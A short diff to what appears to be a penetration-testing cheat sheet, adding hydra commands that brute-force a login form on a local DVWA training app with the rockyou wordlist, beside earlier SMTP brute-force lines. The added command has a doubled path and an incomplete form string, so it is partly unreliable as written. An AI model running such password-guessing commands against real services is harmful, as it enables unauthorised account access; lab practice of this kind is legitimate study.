@@ -164,3 +164,9 @@ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
 ```
 hydra -P /usr/share/wordlistsnmap.lst 127.0.0.1 smtp -V
 ```
+### Brute Forcing a Website Login
+- Login page 
+- http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA//DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"
+```
